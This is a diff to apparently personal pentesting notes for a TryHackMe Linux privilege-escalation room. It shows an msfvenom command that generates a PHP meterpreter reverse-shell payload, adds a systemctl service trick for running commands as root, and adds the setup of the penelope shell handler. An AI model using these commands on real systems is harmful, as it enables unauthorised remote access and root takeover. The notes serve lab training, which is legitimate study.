@@ -57,10 +57,17 @@ https://tryhackme.com/room/linprivesc
   * No one can make it work!!!
 * `msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o mrevshell_php_rtcp.phtml`
 
+```bash
+TF=$(mktemp).service
+echo "[Service]
+Type=oneshot
+ExecStart=/bin/sh -c '$@ > /tmp/output'
+[Install]
+WantedBy=multi-user.target" > $TF
+systemctl -f link $TF
+systemctl -f enable --now $TF
+cat /tmp/output
 ```
-set LHOST tun0
-set PAYLOAD payload/php/meterpreter/reverse_tcp
-exploit -j
-sessions -u 1
-sessions -i 2
-```
+
+* `git clone https://github.com/brightio/penelope.git`
+* `python penelope.py`
